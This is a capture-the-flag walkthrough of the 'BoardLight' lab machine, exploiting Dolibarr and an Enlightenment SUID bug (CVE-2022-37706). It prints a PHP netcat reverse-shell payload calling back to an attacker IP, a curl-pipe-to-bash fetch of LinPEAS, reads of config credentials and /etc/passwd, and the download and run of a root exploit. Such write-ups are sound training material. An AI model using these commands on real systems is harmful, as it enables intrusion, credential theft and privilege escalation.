
nmap:

```
nmap -sC -sV {target ip}
```

Added the domain and ip to the hosts file:

```
echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts
```

Gobuster to enumerate vhosts:

```
gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://board.htb
```

Uploads a PHP file to HTML input in Dolibarr to check for reverse shell vuln:

```
<?PHP echo system("whoami");?>
```

It is successful!

Run netcat locally:

```
nc -lnvp 4455
```

Use the payload to get the shell:

```
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.41 4455 >/tmp/f");?>
```
After I get the shell,  I run `whoami`, I get the the user `www-data`. 

Run this command to get a more stable shell, sending the output to `/dev/null`
```
 script /dev/null -c /bin/bash
 ```
Enumerating the files I get some interesting credentials:

```
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ cat
/var/www/html/crm.board.htb/htdocs/conf/conf.php
<...SNIP...>
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';

$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
<...SNIP...>
```
Looking for users I `cat etc/passwd` and get:

```
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ cat /etc/passwd
<...SNIP...>
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```
I login to `larissa` with the credentials above using `ssh`.

Download LinPEAS locally, then set up a web-server locally, and curl LinPEAS from the attacking box:
```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

sudo python3 -m http.server 3000
```
```
curl http://10.10.14.41:3000/linpeas.sh|bash
```
And I get the output:
```
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions

╠══════════════════════
                      ╚════════════════════════════════════╝

<...SNIP...>
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-
gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)

-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-
gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)

-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-
gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)

-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-
gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID
binary!)
<...SNIP...>
```
The file enlightenment stands out, so

```
larissa@boardlight:~$ enlightenment --version
ESTART: 0.00001 [0.00001] - Begin Startup
ESTART: 0.00018 [0.00017] - Signal Trap
ESTART: 0.00026 [0.00008] - Signal Trap Done
ESTART: 0.00034 [0.00009] - Eina Init

ESTART: 0.00073 [0.00038] - Eina Init Done
ESTART: 0.00081 [0.00008] - Determine Prefix
ESTART: 0.00100 [0.00019] - Determine Prefix Done
ESTART: 0.00109 [0.00009] - Environment Variables
ESTART: 0.00117 [0.00008] - Environment Variables Done
ESTART: 0.00125 [0.00007] - Parse Arguments
Version: 0.23.1
E: Begin Shutdown Procedure!
```
I see the version `0.23.1` and after a google search I see there is a vulnerability CVE-2022-37706. This vulnerability allows local users to gain elevated privileges because the binary is `SUID` and is owned as the root user, and the system library function mishandles path names that begin with `/dev/`. I download a proof of concept script locally:

```
wget https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-
exploit/main/exploit.sh
```
I host the exploit with a webserver:

```
python3 -m http.server 2000
```
And download the exploit, 

```
larissa@boardlight:/tmp$ wget http://10.10.14.41:2000/exploit.sh
```
I run the exploit:

```
larissa@boardlight:/tmp$ bash exploit.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
```

I get the root flag by running `cat /root/root.txt`




